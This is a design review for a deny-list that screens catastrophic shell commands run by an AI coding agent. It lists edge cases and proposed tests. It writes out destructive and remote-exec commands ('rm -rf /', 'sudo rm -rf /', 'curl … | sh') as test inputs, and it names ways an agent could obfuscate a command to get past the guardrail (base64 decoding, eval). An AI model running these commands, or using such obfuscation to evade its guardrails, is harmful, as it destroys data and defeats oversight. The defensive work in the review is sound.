# Discover Edge Case Review — m3-catastrophic-shell

Date: 2026-06-20
Discovery plan analyzed: .claude/knowledge-base/discoveries/plans/m3-catastrophic-shell-plan.md
Research questions analyzed: 4
Edge cases found: 4 (MUST FIX: 0, SHOULD TEST: 2, DOCUMENT: 2)

Cited paths (codex command_safety, opencode bash.ts, in-repo network-guard + shell-exec) verified by the baseline explorations.

## MUST FIX

(none — the deny-list is a heuristic guardrail with codex precedent; ADR D2 + the Q4 guardrail gate already lock the scope.)

## SHOULD TEST

### EC-1: command chaining + sudo prefix hides a catastrophic segment
- **Affected question:** Q4
- **Suggested halt-loop checkpoint:** the blueprint MUST screen each SEGMENT after splitting on `;` `&&` `||` `|` (and strip a leading `sudo`/`env`/`command` prefix), so `ls && rm -rf /` and `sudo rm -rf /` are caught, not just a bare `rm -rf /`. Pin a test per chaining operator + sudo prefix. (codex recurses into `sudo` and parses `bash -lc` — mirror the segment approach.)

### EC-2: `curl … | sh` (and `wget | sh`) pipe-to-shell
- **Affected question:** Q4
- **Suggested halt-loop checkpoint:** the canonical remote-exec vector is `curl <url> | sh` / `wget -O- <url> | bash`. The segment screen must flag a pipe whose downstream segment is a shell (`sh`/`bash`/`zsh`) fed by a `curl`/`wget` upstream. Pin a test for `curl http://x | sh`.

## DOCUMENT

### EC-3: a deny-list is a GUARDRAIL, not a security boundary (bypassable)
- **Accepted risk:** a determined agent can obfuscate (`$(echo <base64> | base64 -d)`, variable indirection, `eval`). The deny-list raises the bar against accidental/obvious catastrophic commands (the realistic failure mode for an LLM agent) — it is NOT a sandbox. The blueprint MUST state this honestly (the roadmap says "guardrail, não sandbox"); real isolation is a separate concern (codex's landlock sandbox, out of scope). The `allowCatastrophic` opt-out exists for trusted contexts.

### EC-4: over-block on commands that merely MENTION a dangerous string
- **Accepted risk:** `echo "how to rm -rf /"` or `git commit -m "remove with rm -rf"` could trip a naive substring match. Mitigation: match on the first token of each segment (the executable) + its flags, not arbitrary substrings — `rm` as the segment's command with `-rf`/`-fr`/`--recursive --force`, not the literal anywhere. Over-block is the safe failure for a guardrail; the opt-out covers false positives. Documented; the Q4 design uses command-position matching to minimize it.

## Summary

| Question | Edges | MUST FIX | SHOULD TEST | DOCUMENT |
|----------|-------|----------|-------------|----------|
| Q1 | 0 | 0 | 0 | 0 |
| Q2 | 0 | 0 | 0 | 0 |
| Q3 | 0 | 0 | 0 | 0 |
| Q4 | 4 | 0 | EC-1, EC-2 | EC-3, EC-4 |

**Verdict:** DISCOVERY PLAN OK (no MUST FIX; 2 SHOULD-TEST — chaining/sudo + curl|sh — to fold into the execute halt-loop; 2 DOCUMENT — guardrail-not-sandbox + over-block stance)
